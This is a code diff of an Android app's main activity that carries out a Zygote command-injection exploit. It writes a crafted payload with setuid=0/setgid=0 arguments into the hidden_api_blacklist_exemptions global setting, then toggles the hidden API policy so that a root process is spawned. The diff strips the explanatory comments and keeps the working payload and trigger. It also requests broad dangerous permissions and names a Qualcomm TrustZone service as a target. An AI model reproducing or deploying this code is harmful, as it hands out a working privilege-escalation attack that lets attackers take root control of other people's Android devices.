@@ -46,6 +46,9 @@ public class MainActivity extends AppCompatActivity {
     private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
 
     private static final int PERMISSION_REQUEST_CODE = 100;
+    private static final String HIDDEN_API_BLACKLIST_EXEMPTIONS = "hidden_api_blacklist_exemptions";
+    private static final String HIDDEN_API_POLICY = "hidden_api_policy";
+
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
     private Handler handler = new Handler(Looper.getMainLooper());
@@ -86,7 +89,6 @@ public class MainActivity extends AppCompatActivity {
         btnStart = findViewById(R.id.btn_start);
         btnStop = findViewById(R.id.btn_stop);
 
-        // 権限リクエスト（通常のDangerous権限のみ）
         requestNecessaryPermissions();
 
         btnStart.setOnClickListener(v -> {
@@ -115,11 +117,8 @@ public class MainActivity extends AppCompatActivity {
             needed.add(Manifest.permission.READ_MEDIA_IMAGES);
             needed.add(Manifest.permission.READ_MEDIA_VIDEO);
             needed.add(Manifest.permission.READ_MEDIA_AUDIO);
-        }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             needed.add(Manifest.permission.POST_NOTIFICATIONS);
         }
-        // その他の危険権限も必要に応じて追加
         needed.add(Manifest.permission.ACCESS_FINE_LOCATION);
         needed.add(Manifest.permission.ACCESS_COARSE_LOCATION);
         needed.add(Manifest.permission.CAMERA);
@@ -213,14 +212,13 @@ public class MainActivity extends AppCompatActivity {
     private boolean checkAndGuideSecureSettings() {
         try {
             ContentResolver cr = getContentResolver();
-            String test = Settings.Global.getString(cr, Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS);
+            String test = Settings.Global.getString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS);
             appendLog("Settings readable (current value: " + (test != null ? test : "(null)") + ")");
-            // 書き込みテスト
             String original = test;
-            Settings.Global.putString(cr, Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, "test");
-            String newVal = Settings.Global.getString(cr, Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS);
+            Settings.Global.putString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS, "test");
+            String newVal = Settings.Global.getString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS);
             if ("test".equals(newVal)) {
-                Settings.Global.putString(cr, Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, original);
+                Settings.Global.putString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS, original);
                 return true;
             } else {
                 appendLog("Write test failed - WRITE_SECURE_SETTINGS not granted.");
@@ -255,37 +253,27 @@ public class MainActivity extends AppCompatActivity {
         appendLog("--- Zygote Injection via Settings ---");
         try {
             ContentResolver cr = getContentResolver();
-            // ペイロード生成 (Meta Red Team X 手法)
-            // 目標: Zygote に "--setuid=0 --setgid=0 --runtime-init" を実行させる
-            // 3 つの引数を持つコマンド: ["--setuid=0", "--setgid=0", "--runtime-init"]
-            // 加えて、システムサーバーが後に続くコマンドを無視するよう調整
             StringBuilder payload = new StringBuilder();
-            // バッファサイズ調整用のパディング
             int pad = 30;
             for (int i = 0; i < pad; i++) {
                 payload.append("A");
             }
-            // ここから本命: 3 はコマンドの引数個数
             payload.append("3\n");
             payload.append("--setuid=0\n");
             payload.append("--setgid=0\n");
             payload.append("--runtime-init\n");
-            // 遅延エントリ（カンマ区切りで追加）
-            payload.append(",,,X"); // これで 4 エントリになる
+            payload.append(",,,X");
 
             String malicious = payload.toString();
             appendLog("Setting malicious value: " + malicious.replace("\n", "\\n"));
-            Settings.Global.putString(cr, Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, malicious);
+            Settings.Global.putString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS, malicious);
 
-            // トリガー: ポリシー設定をトグル
-            String oldPolicy = Settings.Global.getString(cr, Settings.Global.HIDDEN_API_POLICY);
-            Settings.Global.putString(cr, Settings.Global.HIDDEN_API_POLICY, "1");
-            Settings.Global.putString(cr, Settings.Global.HIDDEN_API_POLICY, oldPolicy != null ? oldPolicy : "");
+            String oldPolicy = Settings.Global.getString(cr, HIDDEN_API_POLICY);
+            Settings.Global.putString(cr, HIDDEN_API_POLICY, "1");
+            Settings.Global.putString(cr, HIDDEN_API_POLICY, oldPolicy != null ? oldPolicy : "");
             appendLog("Triggered Zygote update. Check if a root process appeared.");
 
-            // 念のため、設定値を戻す（再起動後も保持されるので注意）
-            // ただし、ペイロードをそのまま残すと次回起動時に影響する可能性があるため、元に戻す
-            Settings.Global.putString(cr, Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, "");
+            Settings.Global.putString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS, "");
             appendLog("Cleared setting to avoid persistence.");
         } catch (Exception e) {
             appendLog("Zygote injection error: " + e.getMessage());
